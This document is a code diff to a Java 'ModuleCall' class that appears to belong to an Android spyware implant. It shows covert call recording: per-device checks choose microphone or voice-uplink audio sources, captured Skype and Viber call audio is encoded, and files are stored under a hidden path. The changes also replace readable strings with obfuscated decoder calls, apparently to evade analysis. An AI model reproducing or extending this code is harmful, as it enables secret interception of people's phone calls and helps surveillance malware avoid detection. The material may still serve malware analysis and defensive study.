@@ -440,7 +440,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		String tmp = ts.toString();
 
 		// Logfile .3gpp in chiaro, temporaneo
-		String path = Path.hidden() + tmp + M.e(".qzt");
+		String path = Path.hidden() + tmp + M.d_8957657729073663872("KEN_612124CE");
 
 		ModuleMic mic = ModuleMic.self();
 
@@ -659,14 +659,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
 		}
 		// TODO: in Messages
-		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
+		if (model.contains(M.d_6216116765516011776("KEN_7D8DD08F36"))) { // Samsung Galaxy S2
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
+		} else if (model.contains(M.d_6236443879470993173("KEN_09C4B658642E7CA2B6BE4688"))) { // Samsung Galaxy
 															// Nexus
 			supported = true;
 			strategy = MediaRecorder.AudioSource.DEFAULT;
@@ -674,20 +674,20 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
 			}
-		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
+		} else if (model.contains(M.d_6416380897212354036("KEN_EB70E77E885C317A"))) { // Galaxy S3
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
+		} else if (model.contains(M.d_3515059454463600295("KEN_7507EC6EA9"))) { // Motorola xt-910
 			supported = false;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
 			}
-		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
+		} else if (model.contains(M.d_7576425333605011411("KEN_30CA05BABB3BE197"))) { // Samsung Galaxy Tab 7''
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
@@ -930,16 +930,41 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		boolean remote = encodedFile.endsWith("-r.tmp.err");
 
-		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample())) {
+		if (!updateCallInfo(callInfo, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (encodeChunks): unknown call program");
+			}
+			
+			return;
+		}
+		
+		// Decide heuristics logic
+		boolean heur = false;
+		
+		if (callInfo.programId == 0x0146 && remote) { // Skype
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
+			}
+			
+			heur = true;
+		} else if (callInfo.programId == 0x0148) { // Viber
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(encodeChunks): Viber call in progress, disabling bitrate heuristics");
+			}
+			
+			heur = false;
+		} else {
+			// This case should already been taken care of by the previous updateCallInfo()
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (encodeChunks): unknown call program");
+			}
+			
+			return;
+		}
+		
+		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heur))) {
 			Date begin = new Date(first_epoch * 1000L);
 			Date end = new Date(last_epoch * 1000L);
-
-			if (!updateCallInfo(callInfo, false)) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (encodeChunks): unknown call program");
-				}
-				// return;
-			}
 
 			finished[remote ? 1 : 0] = false;
 
